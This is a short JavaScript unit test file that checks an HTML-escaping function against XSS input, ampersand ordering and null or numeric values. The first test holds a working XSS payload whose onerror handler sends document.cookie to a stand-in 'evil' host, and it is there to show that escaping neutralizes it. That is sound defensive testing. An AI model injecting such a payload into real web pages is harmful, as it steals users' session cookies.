import { describe, it, expect } from 'vitest';
import { escapeHtml } from './escapeHtml';

describe('escapeHtml', () => {
  it('neutralizes an HTML/attribute-breakout XSS payload', () => {
    const payload = '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">';
    const out = escapeHtml(payload);
    expect(out).not.toContain('<img');
    expect(out).not.toContain('"');
    expect(out).toBe('&lt;img src=x onerror=&quot;fetch(\'//evil/?c=\'+document.cookie)&quot;&gt;');
  });
  it('escapes & before the rest (no double-escaping ordering bug)', () => {
    expect(escapeHtml('Tom & <b>Jerry</b>')).toBe('Tom &amp; &lt;b&gt;Jerry&lt;/b&gt;');
  });
  it('coerces non-strings and nullish safely', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(42)).toBe('42');
  });
});
